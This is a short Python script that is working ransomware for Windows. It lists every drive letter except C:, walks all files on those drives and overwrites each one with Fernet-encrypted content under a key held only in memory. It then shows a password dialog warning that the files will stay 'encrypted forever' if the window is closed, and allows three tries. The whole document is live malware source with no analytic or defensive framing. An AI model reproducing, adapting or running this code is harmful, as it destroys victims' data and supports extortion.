from os import walk, chdir
from os.path import join
from ctypes import windll
from string import ascii_uppercase
from tkinter import Tk
from tkinter.simpledialog import askstring
from cryptography.fernet import Fernet
from sys import exit


def crypt_basic():
    key = Fernet.generate_key()
    method = Fernet(key)
    return method


def get_drives(mode):
    pw = ""
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in ascii_uppercase:
        if bitmask & 1:
            drives.append(letter + ":")
        bitmask >>= 1
    drives.remove("C:")
    drives.append("sportacus")
    for i in drives:
        pw += i
    if mode == 0:
        return pw
    elif mode == 1:
        return drives
    return drives, pw


def encrypt(method):
    first_counter = 1
    second_counter = 0
    drives = get_drives(1)
    for drive in drives:
        try:
            chdir(drives[0 + first_counter])
        except:
            if second_counter == 1:
                return True
            second_counter += 1
            chdir(drives[0])
        for root, sub, file in walk(drive):
            for files in file:
                try:
                    with open(join(root, files), "rb")as f:
                        file_bytes = f.read()
                    with open(join(root, files), "wb")as f:
                        f.write(method.encrypt(file_bytes))
                except:
                    pass
        first_counter += 1


def decrypt(method):
    first_counter = 1
    second_counter = 0
    drives = get_drives(1)
    for drive in drives:
        try:
            chdir(drives[0 + first_counter])
        except:
            if second_counter == 1:
                return True
            second_counter += 1
            chdir(drives[0])
        for root, sub, file in walk(drive):
            for files in file:
                try:
                    with open(join(root, files), "rb")as f:
                        file_bytes = f.read()
                    with open(join(root, files), "wb")as f:
                        f.write(method.decrypt(file_bytes))
                except:
                    pass
        first_counter += 1


def dialog(pw):
    i = 3
    answer = ""
    root = Tk()
    root.withdraw()
    while answer != pw:
        if i == 0:
            return False
        answer = askstring(title="Enter Password",
                           prompt="All your files have been encrypted in oder to decrypt them you have to enter the password.\nIf you close this windows your files will be encrypted forever!\n{} tries left".format(
                               i))
        if answer is None:
            return False
        i -= 1
    return True


drives, pw = get_drives(2)
if len(drives) <= 1:
    exit()
method = crypt_basic()

while not encrypt(method):
    pass
if dialog(pw):
    while not decrypt(method):
        pass
